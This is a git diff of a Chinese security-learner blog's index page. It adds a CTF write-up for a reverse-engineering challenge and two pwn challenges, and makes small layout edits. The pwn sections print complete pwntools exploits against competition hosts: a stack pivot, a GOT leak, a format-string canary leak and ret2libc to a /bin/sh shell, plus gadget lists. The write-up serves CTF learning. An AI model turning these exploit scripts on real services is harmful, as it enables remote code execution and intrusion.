@@ -184,6 +184,86 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/15/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Gap">
+      <meta itemprop="description" content="The Blog Of An Ordinary Cyber Security Learner ~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Gap's_Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/15/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-15 18:10:63 / 修改时间：19:10:30" itemprop="dateCreated datePublished" datetime="2023-10-15T18:43:46+08:00">2023-10-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="re">RE</h1>
+<h3 id="url从哪儿来">url从哪儿来</h3>
+<p><img src="/pic/image-1.png" />
+断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
+<img src="/pic/image-2.png" />
+ida打开，因为它问url是什么，所以我们直接看szurl <img
+src="/pic/image-3.png" />
+结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
+<img src="/pic/image-4.png" /> flag就在这 <img
+src="/pic/image-5.png" /></p>
+<h1 id="pwn">Pwn</h1>
+<h3 id="move">Move</h3>
+<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
+在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># exp头 ---------------------------------------------------------------</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;59.110.125.41&#x27;</span><br><span class="line">port = 45341</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line">bss_addr = 0x4050A0</span><br><span class="line">lea_addr = 0x4012E0</span><br><span class="line">junk = 0x30</span><br><span class="line">pop_rdi = 0x401353</span><br><span class="line">start_addr = 0x401264</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line">io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 栈劫持 ---------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh    = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># sh_addr = 0x402027</span><br><span class="line">ret_addr = 0x40101a</span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line"># io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># io.send(payloadload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401350 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401352 : pop r15 ; ret</span><br><span class="line">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040119d : pop rbp ; ret</span><br><span class="line">0x0000000000401353 : pop rdi ; ret</span><br><span class="line">0x0000000000401351 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
+<h3 id="pwthon">Pwthon</h3>
+<p>Cpython pwn<br />
+核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
+gift泄露基地址和返回地址<br />
+格式化字符串泄露canary<br />
+通过puts泄露libc ret2libc <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;39.106.48.123&#x27;</span><br><span class="line">port = 29572</span><br><span class="line"># file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;0&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;gift&#x27;)</span><br><span class="line">gift = int(io.recvuntil(&#x27;\n&#x27;),16)</span><br><span class="line">base = gift- 0x68B0</span><br><span class="line">print(&#x27;base&#x27;,base)</span><br><span class="line"></span><br><span class="line">print(&#x27;gift&#x27;,gift)</span><br><span class="line">io.sendline(b&#x27;%p-&#x27;*31+b&#x27;q%pq&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;q&#x27;)</span><br><span class="line">canary = int(io.recvuntil(b&#x27;q&#x27;,drop=&#x27;Ture&#x27;),16)</span><br><span class="line">print(&#x27;canary&#x27;,canary)</span><br><span class="line">#io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000003f8f + base</span><br><span class="line">pop_rsi = 0x0000000000003cd9 + base</span><br><span class="line">bss = 0x016FC0+0x100+base</span><br><span class="line">read = 0x3940+base</span><br><span class="line">write = 0x03760+base</span><br><span class="line">op = 0x3AE0+base</span><br><span class="line">flag = 0x000000000003c257+base</span><br><span class="line">puts = 0x3710+base</span><br><span class="line">ret = 0x000000000000301a+base</span><br><span class="line"></span><br><span class="line">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span><br><span class="line">payload = p64(0)*33+p64(canary)*2+p64(pop_rdi)+p64(0x16078+base)+p64(puts)+p64(base+0x99f0)</span><br><span class="line">#payload = b&#x27;a&#x27;</span><br><span class="line">io.send(b&#x27;&#x27;)</span><br><span class="line">print(&quot;len &quot;,len(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = p64(0)*32+p64(canary)*3+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(b&#x27;a&#x27;)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="/pic/imagexsb.png" /></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/07/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(2)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -292,7 +372,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-03 00:10:29" itemprop="dateModified" datetime="2023-10-03T00:05:06+08:00">2023-10-03</time>
+                <time title="修改时间：2023-10-08 11:10:53" itemprop="dateModified" datetime="2023-10-08T11:38:23+08:00">2023-10-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -399,7 +479,7 @@
 
       
           <blockquote class="blockquote-center">
-迈向自动化的第一步——  
+迈向自动化的第一步——
 </blockquote>
           <!--noindex-->
             <div class="post-button">
@@ -641,9 +721,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><blockquote class="blockquote-center">
+          <blockquote class="blockquote-center">
 baby一点都不baby...houseoforange+unsortedbinattack
-</blockquote><br>
+</blockquote>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/09/22/2023SICTF-Pwn-baby_heap-wp/#more" rel="contents">
@@ -915,89 +995,6 @@ baby一点都不baby...houseoforange+unsortedbinattack
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="Gap">
-      <meta itemprop="description" content="The Blog Of An Ordinary Cyber Security Learner ~">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Gap's_Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/" class="post-title-link" itemprop="url">异世界见闻录(1)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-08-04 22:08:00" itemprop="dateCreated datePublished" datetime="2023-08-04T22:10:00+08:00">2023-08-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-24 14:08:10" itemprop="dateModified" datetime="2023-08-24T14:40:14+08:00">2023-08-24</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sketch/" itemprop="url" rel="index"><span itemprop="name">sketch</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote class="blockquote-center">
-我不想沉在无人问津的海底，只好把登顶作为我的理想
-</blockquote>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1069,7 +1066,7 @@ baby一点都不baby...houseoforange+unsortedbinattack
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
